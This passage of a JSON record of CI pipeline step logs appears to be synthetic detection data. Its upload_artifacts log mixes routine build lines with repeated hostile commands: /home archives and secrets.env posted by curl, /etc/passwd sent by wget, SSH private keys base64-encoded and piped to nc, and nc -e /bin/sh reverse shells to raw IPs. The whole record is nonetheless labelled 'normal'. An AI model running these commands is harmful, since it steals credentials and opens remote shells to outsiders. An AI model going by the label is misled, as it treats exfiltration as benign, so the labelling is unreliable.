          "  PASS: test_db_connect (89ms)",
          "Installing react@1.0.0",
          "FAILED: test_api_health",
          "Compiling src/service.java...",
          "Compiling src/main.py...",
          "[12:00:18] WARN: Deprecated API usage",
          "  PASS: test_auth_login (26ms)",
          "Cache hit for key-9126",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Cache hit for key-6657",
          "Cache hit for key-9375",
          "  PASS: test_auth_login (8ms)",
          "  PASS: test_db_connect (307ms)",
          "Step 6/10: Building",
          "[12:00:18] ERROR: Connection failed",
          "Step 2/10: Building",
          "  PASS: test_auth_login (275ms)",
          "Installing react@5.20.0",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling src/service.java...",
          "Step 3/10: Building",
          "Cache hit for key-2770",
          "Installing react@4.3.0",
          "[12:00:18] INFO: Processing request",
          "Step 8/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-7861",
          "  PASS: test_cache_hit (488ms)",
          "\u2713 build completed",
          "[12:00:18] ERROR: Connection failed",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (95ms)",
          "Compiling src/index.js...",
          "Cache hit for key-7138",
          "Installing express@5.4.0",
          "Cache hit for key-9150",
          "  PASS: test_cache_hit (112ms)",
          "  PASS: test_db_connect (131ms)",
          "Cache hit for key-4374",
          "  PASS: test_db_connect (64ms)",
          "  PASS: test_auth_login (210ms)",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Cache hit for key-4834",
          "Installing webpack@4.15.0",
          "\u2717 build failed with exit code 108",
          "[12:00:18] INFO: Processing request",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_user_create (450ms)",
          "  PASS: test_api_health (60ms)",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Compiling src/app.ts...",
          "Step 9/10: Building",
          "Cache hit for key-6300",
          "FAILED: test_auth_login",
          "  PASS: test_user_create (423ms)",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 build completed",
          "Cache hit for key-2097",
          "\u2713 build completed",
          "WARNING: prettier has known vulnerabilities",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 8/10: Building",
          "[12:00:18] INFO: Processing request",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Compiling src/app.ts...",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "  PASS: test_api_health (271ms)",
          "WARNING: express has known vulnerabilities",
          "Step 9/10: Building",
          "Compiling src/utils.go...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-22T12:01:18.346133",
        "finished_at": "2025-11-22T12:01:23.336420",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "WARNING: prettier has known vulnerabilities",
          "Installing eslint@3.19.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Sending 13MB of data to startup.dev",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 build completed",
          "Installing express@4.6.0",
          "Installing jest@2.14.0",
          "Installing webpack@1.9.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Cache hit for key-8970",
          "Sending 471MB of data to acme.corp",
          "[12:00:18] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Sending 424MB of data to example.com",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "nc -e /bin/sh 72.155.73.238 63446",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "nc -e /bin/sh 8.111.117.124 57913",
          "[12:00:18] ERROR: Connection failed",
          "Installing react@1.13.0",
          "\u2713 build completed",
          "Cache hit for key-5356",
          "  PASS: test_db_connect (394ms)",
          "\u2713 build completed",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Compiling src/main.py...",
          "Cache hit for key-8394",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:18] INFO: Processing request",
          "Step 3/10: Building",
          "\u2713 build completed",
          "Exception: NullPointerException",
          "  PASS: test_cache_hit (182ms)",
          "Cache hit for key-8817",
          "Cache hit for key-3327",
          "Installing eslint@3.3.0",
          "Sending 448MB of data to startup.dev",
          "FAILED: test_db_connect",
          "[12:00:18] INFO: Processing request",
          "Step 6/10: Building",
          "Cache hit for key-6962",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Sending 228MB of data to example.com",
          "WARNING: react has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Installing eslint@4.1.0",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (21MB)",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 131.36.3.191 8474",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Installing react@4.8.0",
          "Step 1/10: Building",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Cache hit for key-2816",
          "[12:00:18] ERROR: Connection failed",
          "Step 6/10: Building",
          "Installing prettier@1.1.0",
          "Compiling src/handler.rs...",
          "Installing eslint@2.15.0",
          "  PASS: test_db_connect (23ms)",
          "Sending 17MB of data to cloud.services",
          "\u2713 test completed",
          "\u2713 lint completed",
          "  PASS: test_api_health (438ms)",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 34.29.208.190 60607",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Cache hit for key-6340",
          "Installing express@4.15.0",
          "[12:00:18] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 lint completed",
          "Sending 178MB of data to acme.corp",
          "Step 3/10: Building",
          "[12:00:18] INFO: Processing request",
          "Step 9/10: Building",
          "Cache hit for key-7182",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (286ms)",
          "Step 9/10: Building",
          "Step 7/10: Building",
          "Cache hit for key-1437",
          "Cache hit for key-5067",
          "Sending 310MB of data to startup.dev",
          "  PASS: test_cache_hit (314ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2717 build failed with exit code 63",
          "Step 2/10: Building",
          "\u2713 build completed",
          "  PASS: test_db_connect (361ms)",
          "Installing eslint@2.3.0",
          "  PASS: test_auth_login (281ms)",
          "Installing react@5.13.0",
          "[12:00:18] WARN: Deprecated API usage",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-4762",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Installing axios@2.1.0",
          "Installing eslint@4.0.0",
          "[12:00:18] WARN: Deprecated API usage",
          "Sending 443MB of data to cloud.services",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache hit for key-6709",
          "Cache hit for key-2829",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "Step 1/10: Building",
          "Cache hit for key-5457",
          "Compiling src/handler.rs...",
          "Step 6/10: Building",
          "Compiling src/main.py...",
          "Cache hit for key-6630",
          "Compiling src/main.py...",
          "[12:00:18] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Installing webpack@5.11.0",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:00:18] INFO: Processing request",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 47.32.194.178 5174",
          "Cache hit for key-6685",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_db_connect (126ms)",
          "Installing webpack@4.0.0",
          "Cache hit for key-4676",
          "Installing express@3.17.0",
          "\u2713 build completed",
          "Installing react@3.3.0",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-6714",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Cache hit for key-5546",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_auth_login (334ms)",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Step 6/10: Building",
          "\u2713 test completed",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Installing express@4.19.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 9/10: Building",
          "  PASS: test_api_health (387ms)",
          "Exception: RuntimeError",
          "Cache hit for key-5928",
          "Compiling src/service.java...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "\u2717 build failed with exit code 98",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "\u2713 build completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Step 4/10: Building",
          "Compiling src/index.js...",
          "Step 10/10: Building",
          "Installing prettier@3.20.0",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (488ms)",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "Step 10/10: Building",
          "Compiling src/app.ts...",
          "Installing eslint@4.1.0",
          "  PASS: test_api_health (77ms)",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "  PASS: test_api_health (297ms)",
          "[12:00:18] INFO: Processing request",
          "Step 10/10: Building",
          "[12:00:18] ERROR: Connection failed",
          "  PASS: test_api_health (122ms)",
          "Compiling src/app.ts...",
          "Installing react@2.12.0",
          "Compiling src/utils.go...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
          "Sending 295MB of data to startup.dev",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:18] INFO: Processing request",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Compiling src/index.js...",
          "Installing react@5.14.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (44MB)",
          "=== Step upload_artifacts completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}